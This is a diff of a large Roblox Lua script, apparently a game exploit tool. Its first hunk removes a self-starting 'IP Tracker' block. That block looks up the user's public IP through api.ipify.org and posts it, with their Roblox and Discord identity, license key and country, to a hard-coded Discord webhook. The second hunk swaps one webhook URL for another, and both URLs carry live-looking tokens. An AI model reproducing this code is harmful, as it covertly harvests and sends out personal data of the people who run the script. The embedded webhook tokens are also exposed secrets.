@@ -2686,131 +2686,7 @@ if type(LRM_SEND_WEBHOOK) ~= "function" then
         end
 end
 
-;(function()
-        local function _getPublicIPv4()
-                local ok, body = pcall(function()
-                        if syn and syn.request then
-                                return (syn.request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        if http and http.request then
-                                return (http.request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        if http_request then
-                                return (http_request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        if request then
-                                return (request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        return _hs:GetAsync("https://api.ipify.org/")
-                end)
-                if ok and type(body) == "string" then
-                        local ip = body:match("(%d+%.%d+%.%d+%.%d+)")
-                        if ip then
-                                return ip
-                        end
-                end
-                return "Unknown"
-        end
-        local function _getRobloxUser()
-                local ok, info = pcall(function()
-                        local p = LocalPlayer
-                        if not p then
-                                return nil
-                        end
-                        return {
-                                name = p.Name,
-                                displayName = p.DisplayName,
-                                userId = p.UserId,
-                        }
-                end)
-                if ok then
-                        return info
-                end
-                return nil
-        end
-        task.spawn(function()
-                local user = _getRobloxUser()
-                local ipv4 = _getPublicIPv4()
-                local userInfo, robloxLink, robloxId
-                if user then
-                        userInfo = "**" .. user.name .. "** (" .. user.displayName .. ")"
-                        robloxLink = "https://www.roblox.com/users/" .. tostring(user.userId)
-                        robloxId = "`" .. tostring(user.userId) .. "`"
-                else
-                        userInfo, robloxLink, robloxId = "Unknown", "Unknown", "Unknown"
-                end
-                pcall(function()
-                        LRM_SEND_WEBHOOK("https://discord.com/api/webhooks/1501323938595340329/utDY-npNEK2TJQJLNM4W4WVGJnhL2_dNLwh9Ao1SzS4q-_wthcIJAMq5Gw-iGzod7hQ4", {
-                                username = "IP Tracker",
-                                embeds = {
-                                        {
-                                                title = "🔔 Script Executed",
-                                                description = "",
-                                                color = 65280,
-                                                fields = {
-                                                        {
-                                                                name = "💬 Discord User",
-                                                                value = "<@%DISCORD_ID%>",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🔑 Key",
-                                                                value = "`%USER_KEY%`",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "📝 Note",
-                                                                value = "`%USER_NOTE%`",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "👤 Roblox User",
-                                                                value = userInfo,
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🆔 Roblox ID",
-                                                                value = robloxId,
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🔗 Profile",
-                                                                value = robloxLink,
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🌐 IP (IPv4 only)",
-                                                                value = "`" .. ipv4 .. "`",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "📍 Country",
-                                                                value = ":flag_%COUNTRY_CODE%: `%COUNTRY_CODE%`",
-                                                                inline = true
-                                                        },
-                                                },
-                                                footer = {
-                                                        text = "IP Tracker"
-                                                },
-                                                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                                        }
-                                },
-                        })
-                end)
-        end)
-end)()
+
 
 local function _hasFileApi()
         return type(writefile) == "function" and type(readfile) == "function" and type(isfile) == "function"
@@ -13874,7 +13750,7 @@ local function _postReceivedItem(item)
         local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
         local wikiImg = _llFetchFandomImage(item.name)
         local thumbUrl = wikiImg or avatarUrl
-        LRM_SEND_WEBHOOK("https://discord.com/api/webhooks/1498875716979265576/I5GY291lEhocVpwWhYY926r1QiI6LNgaropHb2fxlIPI9qRVWX19PJoqS2YcEUijjnyc", {
+        LRM_SEND_WEBHOOK("https://discord.com/api/webhooks/1508104664099590146/dWcVeOofVNhUMZAqFa1GNrC7LDvsBnmTuHI3UQkbfDjYcFBXVlquK-X_1-W7nwVkXOkb", {
                 username = "KingVisuals Pulls",
                 embeds = {
                         {
